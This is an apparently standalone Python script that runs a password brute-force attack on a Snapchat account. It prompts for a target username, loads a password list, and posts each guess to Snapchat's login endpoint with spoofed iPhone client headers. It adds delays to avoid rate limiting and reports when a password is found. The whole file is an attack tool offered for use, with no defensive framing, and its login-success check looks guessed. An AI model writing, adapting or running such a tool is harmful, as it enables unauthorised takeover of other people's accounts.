import requests
import time
import sys
from colorama import init, Fore, Style

# Initialize colorama for colored output
init(autoreset=True)

def snapchat_login(username, password):
    session = requests.Session()
    login_url = 'https://accounts.snapchat.com/accounts/login'
    
    payload = {
        'username': username,
        'password': password
    }
    
    headers = {
        "User-Agent": "Snapchat/158445 (iPhone; iOS 16.5.1; en_US) Cronet/271.0.16",
        "X-Client-Version": "1.0",
        "Snap-Locale": "en_US"
    }

    try:
        # Sending POST request to login
        response = session.post(login_url, data=payload, headers=headers)
        
        # Checking the response for successful login
        if "v2" in response.json()['data']['_']:
            print(Fore.GREEN + f"[+] Successful login for {username}")
            return True
        else:
            print(Fore.RED + f"[-] Failed login for {username}")
            return False
            
    except requests.exceptions.RequestException as e:
        print(Fore.RED + f"[-] Request error: {e}")
        return False
    except Exception as e:
        print(Fore.RED + f"[-] Unexpected error: {e}")
        return False

def main():
    username = input("Enter Snapchat username to bruteforce: ")
    password_file = "passwords.txt"

    try:
        with open(password_file, "r") as file:
            passwords = file.read().splitlines()
    except FileNotFoundError:
        print(Fore.RED + f"[-] Error: {password_file} not found.")
        sys.exit(1)

    print(Fore.GREEN + f"[*] Starting bruteforce attack on {username}")
    print(Fore.GREEN + f"[*] Loaded {len(passwords)} passwords from {password_file}")

    for password in passwords:
        try:
            # Password attempt
            print(Fore.YELLOW + f"[+] Trying: {password}", end=" | ", flush=True)
            
            if snapchat_login(username, password):
                print(Fore.GREEN + f"[+] Password found: {password}")
                break  # Exit the loop if password is found
            
            print(Fore.RED + "Status = [Fail]")  # Status if login fails
            time.sleep(1)  # Add a short delay to avoid rate-limiting

        except requests.exceptions.RequestException as e:
            print(Fore.RED + f"[-] Network error occurred: {e}")
            time.sleep(30)  # Wait for 30 seconds before retrying
        except KeyboardInterrupt:
            print("\n[!] Bruteforce attack interrupted by user.")
            sys.exit(0)
        except Exception as e:
            print(Fore.RED + f"[-] An unexpected error occurred: {e}")
            time.sleep(10)  # Wait for 10 seconds before continuing

    print(Fore.GREEN + "[*] Bruteforce attack completed.")

if __name__ == "__main__":
    main() 
